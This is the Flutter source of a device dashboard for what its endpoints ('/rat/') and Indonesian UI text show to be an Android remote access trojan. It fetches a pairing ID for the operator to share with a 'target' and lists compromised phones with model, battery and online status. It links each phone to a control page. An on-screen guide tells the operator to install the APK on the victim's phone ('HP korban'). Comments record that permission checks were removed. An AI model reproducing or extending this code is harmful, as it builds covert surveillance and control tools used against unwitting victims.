import 'package:flutter/material.dart';
import 'config.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'device_permission.dart';
import 'control_panel.dart';
import 'package:provider/provider.dart';
import 'theme_provider.dart';

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  const DeviceDashboardPage({
      super.key, this.username = '', this.role ='', this.sessionKey = ''});
  @override State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> {
  List<dynamic> _visible = [];
  bool   _loading  = true;
  String? _errorMsg;
  String  _pairId  = '';
  // DIHAPUS: bool get _isOwner — semua role sekarang punya akses penuh
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 20), (_) => _loadAll());
  }

  @override void dispose() { _timer?.cancel(); super.dispose(); }

  // ── Ambil pairId + device list sekaligus ──────────────────────────────────
  Future<void> _loadAll() async {
    if (!mounted) return;
    try {
      // 1. Ambil pairId akun ini (unik per akun, disimpan di server per username)
      final pRes = await http
          .get(Uri.parse('https://app.atlas-by-erlan.com/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          if (mounted) setState(() => _pairId = pd['pairId'].toString());
        }
      }

      // 2. Ambil device list milik akun ini saja (berdasarkan pairId akun)
      final dRes = await http
          .get(Uri.parse('https://app.atlas-by-erlan.com/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      if (dRes.statusCode != 200) {
        setState(() { _loading = false; _errorMsg = 'Server error ${dRes.statusCode}'; });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() { _loading = false; _errorMsg = body['message'] ?? 'Error'; });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);

      // Tandai online/offline
      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) { d['online'] = false; }
      }

      // Semua role langsung approved — tidak perlu cek permission
      if (mounted) setState(() {
        _visible = devices; _loading = false; _errorMsg = null;
      });
    } catch (e) {
      if (mounted) setState(() { _loading = false; _errorMsg = e.toString(); });
    }
  }

  int get _active => _visible.where((d) => d['online'] == true).length;

  // ── Copy pairId ke clipboard ───────────────────────────────────────────────
  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
        backgroundColor: theme.primaryColor,
        content: const Text('ID berhasil disalin!'),
        duration: const Duration(seconds: 2)));
  }

  @override
  Widget build(BuildContext context) {
    final theme = Provider.of<ThemeProvider>(context);

    return Scaffold(
      backgroundColor: theme.backgroundColor,
      body: SafeArea(child: Column(children: [
        // ─ Header ─────────────────────────────────────────────────────────
        Container(
          padding: const EdgeInsets.fromLTRB(18, 14, 18, 10),
          decoration: BoxDecoration(
            color: theme.glassPrimary,
            border: Border(bottom: BorderSide(color: theme.textPrimaryColor.withOpacity(0.1), width: 1)),
            boxShadow: [
              BoxShadow(
                color: theme.primaryColor.withOpacity(0.1),
                blurRadius: 15,
                spreadRadius: 2,
                offset: const Offset(0, 4)
              )
            ]
          ),
          child: Column(children: [
            Row(children: [
              _statBox('ONLINE', '$_active', Colors.cyanAccent, theme),
              const Spacer(),
              Column(children: [
                Text('DEVICE DASHBOARD',
                    style: TextStyle(
                      color: theme.primaryColor,
                      fontSize: 11,
                      letterSpacing: 2,
                      fontWeight: FontWeight.bold
                    )
                ),
                const SizedBox(height: 4),
                Text('@${widget.username}',
                    style: TextStyle(color: theme.textSecondaryColor, fontSize: 9)),
              ]),
              const Spacer(),
              _statBox('TOTAL', '${_visible.length}', theme.primaryColor, theme),
            ]),

            // ── PairID box — tampil untuk SEMUA user ──────────────────────
            if (_pairId.isNotEmpty) ...[
              const SizedBox(height: 12),
              GestureDetector(
                onTap: _copyPairId,
                child: Container(
                  width: double.infinity,
                  padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                  decoration: BoxDecoration(
                    color: theme.primaryColor.withOpacity(0.05),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: theme.primaryColor.withOpacity(0.3), width: 1),
                  ),
                  child: Row(children: [
                    Icon(Icons.link_rounded, color: theme.primaryColor, size: 18),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text('ID PAIRING (bagikan ke target)',
                              style: TextStyle(
                                color: theme.textSecondaryColor,
                                fontSize: 9,
                                letterSpacing: 1
                              )
                          ),
                          const SizedBox(height: 4),
                          Text(_pairId,
                              style: TextStyle(
                                  color: theme.primaryColor,
                                  fontSize: 16,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 3,
                                  fontFamily: 'monospace'
                              )
                          ),
                        ]
                      )
                    ),
                    const SizedBox(width: 8),
                    Column(
                      crossAxisAlignment: CrossAxisAlignment.center,
                      children: [
                        Icon(Icons.copy_rounded, color: theme.primaryColor, size: 18),
                        const SizedBox(height: 4),
                        Text('SALIN',
                            style: TextStyle(
                              color: theme.primaryColor.withOpacity(0.8),
                              fontSize: 8,
                              fontWeight: FontWeight.bold
                            )
                        ),
                      ],
                    ),
                  ]),
                ),
              ),
              const SizedBox(height: 6),
              Text(
                'Tap untuk menyalin ID • ID ini unik milik akun @${widget.username}',
                style: TextStyle(color: theme.textSecondaryColor, fontSize: 9),
                textAlign: TextAlign.center
              ),
            ],
          ]),
        ),

        // ─ Error banner ───────────────────────────────────────────────────
        if (_errorMsg != null)
          _banner(Icons.error_rounded, _errorMsg!, theme.primaryColor, theme),

        // ─ Toolbar — TANPA tombol Kelola Akses ────────────────────────────
        Padding(
          padding: const EdgeInsets.fromLTRB(16, 10, 16, 6),
          child: Row(children: [
            Text('CONNECTED DEVICES',
                style: TextStyle(
                  color: theme.textSecondaryColor,
                  fontSize: 10,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1.5
                )
            ),
            const Spacer(),
            GestureDetector(
              onTap: () {
                setState(() { _loading = true; _errorMsg = null; });
                _loadAll();
              },
              child: Icon(Icons.refresh_rounded, color: theme.primaryColor, size: 18)
            ),
            const SizedBox(width: 12),
            // DIHAPUS: tombol Kelola Akses (if _isOwner ...)
            GestureDetector(
              onTap: () => Navigator.pop(context),
              child: const Icon(Icons.close_rounded, color: Colors.redAccent, size: 18)
            ),
          ])
        ),

        // ─ Device Grid ────────────────────────────────────────────────────
        Expanded(
          child: _loading
              ? Center(
                  child: CircularProgressIndicator(
                    color: theme.primaryColor,
                    strokeWidth: 2,
                  )
                )
              : _visible.isEmpty
                  ? Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(Icons.devices_other_rounded,
                              color: theme.textSecondaryColor.withOpacity(0.3), size: 52),
                          const SizedBox(height: 14),
                          const Text('NO DEVICES',
                              style: TextStyle(
                                color: Colors.white,
                                fontWeight: FontWeight.bold,
                                letterSpacing: 2,
                                fontSize: 13
                              )
                          ),
                          const SizedBox(height: 6),
                          Text('Belum ada device terhubung',
                              style: TextStyle(color: theme.textSecondaryColor, fontSize: 11)),
                          const SizedBox(height: 20),
                          Container(
                            margin: const EdgeInsets.symmetric(horizontal: 40),
                            padding: const EdgeInsets.all(16),
                            decoration: BoxDecoration(
                              color: theme.primaryColor.withOpacity(0.05),
                              borderRadius: BorderRadius.circular(12),
                              border: Border.all(color: theme.primaryColor.withOpacity(0.2))
                            ),
                            child: Column(children: [
                              Icon(Icons.info_outline_rounded,
                                  color: theme.primaryColor, size: 22),
                              const SizedBox(height: 10),
                              const Text('Cara hubungkan device:',
                                  style: TextStyle(
                                    color: Colors.white,
                                    fontSize: 11,
                                    fontWeight: FontWeight.bold
                                  )
                              ),
                              const SizedBox(height: 8),
                              const Text(
                                '1. Install APK target di HP korban\n2. Buka APK → masukkan ID Pairing di atas\n3. Device otomatis muncul di sini',
                                style: TextStyle(color: Colors.white54, fontSize: 10),
                                textAlign: TextAlign.center,
                              ),
                            ]),
                          ),
                        ]
                      )
                    )
                  : GridView.builder(
                      padding: const EdgeInsets.fromLTRB(14, 8, 14, 100),
                      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                        crossAxisCount: 3,
                        crossAxisSpacing: 10,
                        mainAxisSpacing: 10,
                        childAspectRatio: 0.72
                      ),
                      itemCount: _visible.length,
                      itemBuilder: (ctx, i) {
                        final d = _visible[i];
                        final on = d['online'] == true;
                        final sc = on ? Colors.cyanAccent : Colors.redAccent;

                        return GestureDetector(
                          onTap: () => Navigator.push(ctx, MaterialPageRoute(
                              builder: (_) => ControlCenterPage(
                                  targetDevice: d, role: widget.role))),
                          child: Container(
                            padding: const EdgeInsets.all(10),
                            decoration: BoxDecoration(
                              color: theme.glassPrimary,
                              borderRadius: BorderRadius.circular(14),
                              border: Border.all(
                                color: on
                                  ? theme.primaryColor.withOpacity(0.3)
                                  : theme.textPrimaryColor.withOpacity(0.1),
                                width: 1
                              ),
                              boxShadow: on
                                ? [
                                    BoxShadow(
                                      color: theme.primaryColor.withOpacity(0.1),
                                      blurRadius: 8,
                                      spreadRadius: 1
                                    )
                                  ]
                                : null
                            ),
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Row(
                                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                  children: [
                                    Icon(Icons.phone_android_rounded,
                                        color: theme.textSecondaryColor, size: 14),
                                    Container(
                                      padding: const EdgeInsets.symmetric(
                                          horizontal: 5, vertical: 2),
                                      decoration: BoxDecoration(
                                        color: sc.withOpacity(0.1),
                                        border: Border.all(
                                            color: sc.withOpacity(0.5)),
                                        borderRadius: BorderRadius.circular(6)
                                      ),
                                      child: Row(children: [
                                        Container(
                                          width: 5,
                                          height: 5,
                                          decoration: BoxDecoration(
                                            color: sc,
                                            shape: BoxShape.circle
                                          )
                                        ),
                                        const SizedBox(width: 4),
                                        Text(on ? 'ON' : 'OFF',
                                            style: TextStyle(
                                              color: sc,
                                              fontSize: 7,
                                              fontWeight: FontWeight.bold
                                            )
                                        ),
                                      ]),
                                    ),
                                  ]
                                ),
                                const Spacer(),
                                Text(d['model'] ?? 'Unknown',
                                    style: TextStyle(
                                      color: theme.textPrimaryColor,
                                      fontSize: 10,
                                      fontWeight: FontWeight.bold
                                    ),
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis
                                ),
                                const SizedBox(height: 4),
                                Text(d['id'] ?? '-',
                                    style: TextStyle(
                                      color: theme.textSecondaryColor,
                                      fontSize: 8
                                    ),
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis
                                ),
                                const Spacer(),
                                Row(children: [
                                  Icon(Icons.battery_charging_full_rounded,
                                      color: theme.textSecondaryColor, size: 11),
                                  const SizedBox(width: 4),
                                  Text('${d['battery'] ?? '?'}%',
                                      style: TextStyle(
                                        color: theme.textPrimaryColor,
                                        fontSize: 9
                                      )
                                  ),
                                ]),
                              ],
                            ),
                          ),
                        );
                      }
                    ),
        ),
      ])),
    );
  }

  Widget _banner(IconData icon, String msg, Color c, ThemeProvider theme) => Container(
    margin: const EdgeInsets.fromLTRB(14, 8, 14, 0),
    padding: const EdgeInsets.all(12),
    decoration: BoxDecoration(
      color: c.withOpacity(0.05),
      borderRadius: BorderRadius.circular(10),
      border: Border.all(color: c.withOpacity(0.2))
    ),
    child: Row(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Icon(icon, color: c, size: 16),
        const SizedBox(width: 10),
        Expanded(
          child: Text(msg,
              style: TextStyle(color: c, fontSize: 11, height: 1.4)),
        ),
      ]
    )
  );

  Widget _statBox(String l, String v, Color c, ThemeProvider theme) => Column(children: [
    Text(l,
        style: TextStyle(
          color: theme.textSecondaryColor,
          fontSize: 8,
          letterSpacing: 1
        )
    ),
    const SizedBox(height: 4),
    Text(v,
        style: TextStyle(
          color: c,
          fontSize: 20,
          fontWeight: FontWeight.bold,
          shadows: [
            Shadow(
              blurRadius: 8,
              color: c.withOpacity(0.5),
              offset: const Offset(0, 0)
            )
          ]
        )
    ),
  ]);
}
